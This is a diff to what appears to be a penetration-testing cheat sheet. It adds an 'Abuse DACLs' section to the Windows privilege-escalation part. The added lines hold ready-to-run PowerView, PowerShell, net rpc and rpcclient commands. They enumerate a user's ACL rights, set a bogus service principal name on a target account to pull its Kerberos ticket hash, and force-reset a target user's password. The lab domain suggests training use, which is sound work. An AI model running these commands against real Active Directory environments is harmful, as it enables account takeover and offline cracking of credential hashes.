@@ -89,6 +89,7 @@
   - [Windows](#windows-4)
     - [PowerUp](#powerup)
     - [SharpUp](#sharpup)
+    - [Abuse DACLs](#abuse-dacls)
     - [LOLBIN](#lolbin-1)
     - [token](#token-1)
     - [SePriv](#sepriv)
@@ -1026,6 +1027,10 @@ Convert-SidToName $geneall
 # DCSync
 $dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
 Convert-SidToName $dcsync
+
+# DACL
+$userSID = (Get-DomainUser -Identity own_user).objectsid
+Get-DomainObjectAcl -Identity target_user | ?{$_.SecurityIdentifier -eq $userSID}
 ```
 ### winPEAS
 ```powershell
@@ -1262,6 +1267,29 @@ Ghostpack
 ```powershell
 .\SharpUp.exe audit
 ```
+
+### Abuse DACLs
+Set SPN
+GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN 
+```powershell
+# PowerView
+Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
+Get-DomainUser target_user -SPN | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
+Set-DomainObject -Identity target_user -Clear serviceprincipalname -Verbose
+```
+Reset Password
+GenericAll, AllExtendedRights, User-Force-Change-Password
+```powershell
+Set-ADAccountPassword target_user -NewPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Reset -Verbose
+```
+```linux
+# net rpc
+net rpc password target_user 'Password123!' -U inlanefreight.local/own_user%'Password1' -S 10.129.205.81
+
+# rpcclient
+setuserinfo2 target_user 23 Password123!
+```
+
 ### LOLBIN
 ```powershell
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
